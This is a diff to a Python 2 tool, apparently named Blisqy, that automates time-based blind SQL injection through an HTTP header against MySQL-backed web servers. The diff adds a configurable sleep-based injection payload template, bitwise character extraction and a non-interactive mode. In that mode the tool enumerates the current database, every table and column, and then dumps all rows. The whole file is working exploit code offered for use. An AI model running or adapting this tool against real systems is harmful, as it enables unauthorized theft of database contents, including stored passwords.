@@ -1,12 +1,20 @@
 #!/usr/bin/python
 
+## Writer : John Troony
+## Online-handle : @johntroony
+## Version : Beta
+## Purpose : <put any good reason here>
+## Comment : I fucking love binary operations <3
+##           Can someone make this a little faster?
+
+
 from socket import (socket, AF_INET, SOCK_STREAM )
 import optparse
 import time
 import sys
 
 def testSql(sql,sleepTime):
-    '''Tests for blind sql injection. If it takes time (> 0.5) to execute a query then True, else False '''
+    '''Time-based BlindSQLi Test. If it takes time (> sleepTime) to execute a query then True, else False '''
 
     # Connect to webserver
     try:
@@ -15,10 +23,15 @@ def testSql(sql,sleepTime):
 
         # Mark time before execution
         t1 = time.time()
-        
+        try:
+            injection = SQLinject       
+
+            injection = injection.replace("*sql*", sql)
+            injection = injection.replace("*time*", str(sleepTime))
+        except Exception as error:
+            print red + str(error) + clear
+            sys.exit(0)
                 
-        trigger = "' or if((%s),sleep(0.9),0) and '1'='1" % sql
-        
         # Send our Payload
         data = ""
         data += "GET / HTTP/1.1\r\n"
@@ -26,7 +39,7 @@ def testSql(sql,sleepTime):
         data += server+"\r\n"
         data += vulnHeader
         data += ": "
-        data += headerValue+trigger+"\r\n"
+        data += headerValue+injection+"\r\n"
         data += "Connection: close\r\n\r\n"
         
         s.send(data)
@@ -46,7 +59,7 @@ def testSql(sql,sleepTime):
 
 
 def constructor(x,inj,sleepTime):
-    '''Use bit masking to retrieve each bit value of a character and rebuild it '''
+    '''Use bit masking to retrieve each bit value of a character and rebuild its ACII equivalent'''
 
     strx = ""
 
@@ -75,6 +88,7 @@ def constructor(x,inj,sleepTime):
         return alpha
 
 def DataPump(x,payload,sleepTime):
+    '''Sends SQL Payload to function constructor() to construct the response/result from DB'''
            
     result = ""
     
@@ -96,12 +110,16 @@ def DataPump(x,payload,sleepTime):
             exit()
 
 def StatusUpdate(payload):
+    '''Prints an update of what Blisqy is doing...'''
     print cyan+"Extracting Data from ====> %s : %s %s" % (server,port,clear) 
     print green + "Current Payload : " + clear + red + payload + clear
     breaker = cyan + "==================================================================" + clear
     print breaker
 
 def BreakPoint(message):
+    '''When --interactive option is set to on, this function helps Blisqy pause execution and 
+        the user decide on what Blisqy should do next. '''
+
     print "\n"
     userAction =  yellow + message + clear
     ans = raw_input(userAction)
@@ -114,14 +132,15 @@ def BreakPoint(message):
             sys.exit()
 
 
-def tableDigger(table):
+def tableDigger(table,interactive):
+    '''This function is responsible for enumerating tables in a Schema/DB and pulling data from the identified tables. '''
+
     print cyan + "Preparing to Enumerate Table : %s" % table + clear
     line = cyan + "=====================================================" + clear
     print line
     
     # Get Number of Columns in a Table
     print green + "[+] Getting Number of Columns in Table : %s" % table + clear
-    #CountColumns = "Select count(*) from (SELECT column_name FROM information_schema.columns WHERE table_name=%s AND table_schema != 'mysql' AND table_schema != 'information_schema') t" % table
     CountColumns = "SELECT count(*) from (SELECT column_name FROM information_schema.columns WHERE table_name = '%s') t" % table
     CountedColumns = DataPump(x,CountColumns,sleepTime)
    
@@ -137,11 +156,9 @@ def tableDigger(table):
     while counter <= int(CountedColumns):
         GetColumn = "select column_name FROM (select column_name FROM information_schema.columns WHERE table_name='%s' AND table_schema != 'mysql' AND table_schema != 'information_schema' order by column_name limit %d) t order by column_name desc limit 1" % (table,counter)
         column = DataPump(x,GetColumn,sleepTime)
+        print yellow + "[-] " + column + clear
         columns.append(column)
         counter = counter +1
-        
-    for column in columns:
-        print yellow + "[-] " + column + clear
     
     print "\n"
           
@@ -155,83 +172,135 @@ def tableDigger(table):
     rows = []
     counter = 1
     
-    # Get all data from rows
-    print green + "[+] Getting data from Table : %s ." % table + clear
-    outMsg = red + "Enter Columns for output separated by a dash (-). e.g id-fname-passwd  : " + clear
-    OutputColumns = raw_input(outMsg)
-    
-    
-    if OutputColumns != 'skip':
-        OutputColumns = OutputColumns.replace("-",",':',")
-        print OutputColumns
+    interactive = interactive.lower()
+
+    if interactive == "on":
+        # Get all data from rows
+        print green + "[+] Getting data from Table : %s " % table + clear
+        outMsg = red + "Enter Columns separated by an asterisk (*). e.g id*fname*passwd or skip : " + clear
+        OutputColumns = raw_input(outMsg)
+        outMsgColums = OutputColumns.replace("*"," : ")
         
+        
+        if OutputColumns != 'skip':
+            print cyan + "[-] %s" % outMsgColums
+            OutputColumns = OutputColumns.replace("*",",' : ',")
+            
+            while counter <= int(CountedRows):
+                getRow = "select result from (select concat(%s) result from %s order by result limit %d) t order by result desc limit 1" % (OutputColumns,table,counter)
+                row = DataPump(x,getRow,sleepTime)
+                print yellow + "[-] " + row + clear
+                rows.append(row)
+                counter = counter +1
+        
+        
+        elif OutputColumns == 'skip':
+            print red + "Skipping....." + clear
+
+
+    elif interactive == "off":
+        print green + "[+] Getting data from Table : %s " % table + clear
+        # Concat all Columns
+        query_colums = ''
+        for discovered_column in columns:
+            query_colums += discovered_column+",':',"
+
+        query_colums = query_colums[:-5]
+
+        outMsgColums = query_colums.replace(",':',",":")
+        print cyan + "[-] %s" % outMsgColums
+
         while counter <= int(CountedRows):
-            getRow = "select result from (%s) result from users %s by result limit %d) t order by result desc limit 1" % (OutputColumns,table,counter)
+            getRow = "select result from (select concat(%s) result from %s order by result limit %d) t order by result desc limit 1" % (query_colums,table,counter)
             row = DataPump(x,getRow,sleepTime)
+            print yellow + "[-] " + row + clear
             rows.append(row)
             counter = counter +1
-        
-        for row in rows:
-            print yellow + "[-] " + row + clear
-    
-    elif OutputColumns == 'skip':
-        print red + "Skipping....." + clear
-    
-
-
 
 
 def MysqlDigger(sleepTime,interactive):
+    '''This function automates the process of enumerating all availabe tables in a DB/Schema and calls 
+       tableDigger() to pull data from the identified tables. '''
+
+
     # Get Current Database
     print green + "[+] Getting Current Database : " + clear
     
-    currentDB = "select database()"
-    DBname = DataPump(x,currentDB,sleepTime)
-   
-    print yellow + "[-] " + DBname + clear
-    print "\n"
-    
-    
-    # Count number of TABLES available in non system schema (to be used in getting tableNames)
-    print green + "[+] Getting  number of TABLES from Schema " + clear
-    
-    tableCount = "select count(*) from (SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema') t"
-    CountedTables = DataPump(x,tableCount,sleepTime)
-    
-    print yellow + "[-] " + CountedTables + clear
-    print "\n"
-    
-    counter = 1
-    tables = []
+    try:
+        currentDB = "select database()"
+        DBname = DataPump(x,currentDB,sleepTime)
+       
+        print yellow + "[-] " + DBname + clear
+        print "\n"
+        
+        
+        # Count number of TABLES available in non system schema (to be used in getting tableNames)
+        print green + "[+] Getting  number of TABLES from Schema " + clear
+        
+        tableCount = "select count(*) from (SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema') t"
+        CountedTables = DataPump(x,tableCount,sleepTime)
+        
+        print yellow + "[-] " + CountedTables + clear
+        print "\n"
+        
+        counter = 1
+        tables = []
+
+    except Exception as err:
+        print err
     
     # Get all TABLE_NAMES from schema, increment inner limit till total counted TABLES available
     print green + "[+] Getting  all TABLE NAMES from Schema " + clear
     
-    while counter <= int(CountedTables):
-        GetTableName = "select table_name from (SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' order by table_name limit %d) t order by table_name desc limit 1" % counter
-        TableName = DataPump(x,GetTableName,sleepTime)
-        
-        print yellow + "[-] " + TableName + clear
-        
-        tables.append(TableName)
-        counter = counter +1
+    try:
+        while counter <= int(CountedTables):
+            GetTableName = "select table_name from (SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' order by table_name limit %d) t order by table_name desc limit 1" % counter
+            TableName = DataPump(x,GetTableName,sleepTime)
+            
+            print yellow + "[-] " + TableName + clear
+            
+            tables.append(TableName)
+            counter = counter +1
 
 
-    # Get all TABLE_NAMES from all Columns from discovered Tables
-    if interactive == "on":
+        # Get all TABLE_NAMES from all Columns from discovered Tables
+        if interactive == "on":
+            
+            msg = "Get all Columns from discovered Tables? yes/no  :  "
+            BreakPoint(msg)
+            print "\n"
         
-        msg = "Get all Columns from discovered Tables? yes/no  :  "
-        BreakPoint(msg)
-        print "\n"
-    
-        for table in tables:
-            tableDigger(table)
+            msgout = green + "[+] Enumerate a Specific Table (yes/no) : " + clear
+            ans = raw_input(msgout)
+            ans = ans.lower()
+
+            if (ans == "y") | (ans == "yes") :
+                msgout = green + "[+] Enter Table Name : " + clear
+                userTable = raw_input(msgout)
+
+                # Check if table is in list tables before movin on
+                while userTable not in tables:
+                    msgout = red + "[+] Are you nutts! Enter a valid Table Name : " + clear
+                    userTable = raw_input(msgout)
+                
+                tableDigger(userTable,interactive)
+                sys.exit()
+
+
+            elif (ans == "n") | (ans == "no")  :
+                for table in tables:
+                    tableDigger(table,interactive)
+                
+        elif interactive == "off":
+            for table in tables:
+                tableDigger(table,interactive)
             
-    elif interactive == "off":
-        for table in tables:
-            tableDigger(table)
-            
+    except Exception as err:
+        print err
+
+
 if __name__ == '__main__':
+    '''Are we imorted or executed? If executed, start from here (entry point)'''
        
     value = 0
     x = 1
@@ -262,7 +331,7 @@ if __name__ == '__main__':
     global vulnHeader
     global headerValue
     global payload
-    global injection
+    global SQLinject
     global mysqldig
     
     
@@ -271,19 +340,31 @@ if __name__ == '__main__':
     vulnHeader = options.VulnHeader
     headerValue = options.HeaderValue
     payload = options.Payload
-    injection = options.Injection
+    SQLinject = options.Injection
     mysqldig = options.Digger
     sleepTime = options.Sleep
     interactive = options.interact
-    
+
+    if (SQLinject == None):
+        # We expect something like "' or if((*sql*),sleep(*time*),0) and '1'='1"
+        print yellow + "Please Provide Where to Inject SQL Payloads.. --inject" + clear
+        print "\n"
+        print yellow + "For Example :" + clear
+        print cyan + "' or if(("+red+"*sql*"+clear+cyan+"),sleep("+red+"*time*"+clear+cyan+"),0) and '1'='1" + clear
+        print "\n"
+        print green + red+"*sql*"+clear+green+" : This is where SQL Payloads will be inserted" + clear
+        print green + red+"*time*"+clear+green+" : This is where Time-Based test will be inserted" + clear
+        sys.exit(0)
+
     if (sleepTime == None):
-        sleepTime = 0.9
+        sleepTime = 0.5
     
     if (interactive == None):
         interactive = "off"
-    
+
+
     if (server == None) | (port == None) | (vulnHeader == None) | (headerValue == None ):
-        print "Please Provide All Required Arguments!"
+        print yellow + "Please Provide All Required Arguments!" + clear
         print red+"USAGE:"+clear
         print cyan + parser.usage + clear
         sys.exit(0)
@@ -295,4 +376,3 @@ if __name__ == '__main__':
         
     elif (mysqldig == "yes") | (mysqldig == "Yes") | (mysqldig == "YES" ):
         MysqlDigger(sleepTime,interactive)
-    
